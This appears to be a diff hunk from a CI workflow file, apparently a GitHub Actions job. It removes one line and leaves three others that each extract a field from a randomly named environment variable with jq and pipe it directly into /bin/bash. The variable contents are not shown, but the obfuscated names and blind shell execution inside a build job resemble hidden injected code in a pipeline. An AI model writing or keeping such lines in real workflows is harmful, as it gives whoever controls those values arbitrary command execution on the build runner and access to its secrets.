@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$uz2995" | jq -r .rf8432 | /bin/bash
           echo $ptk90056 | jq -r .xdd73 | /bin/bash
           printf '%s' "$obnu97583" | jq -r .mf8 | /bin/bash
-          echo $fe646 | jq -r .nwmqg68083 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
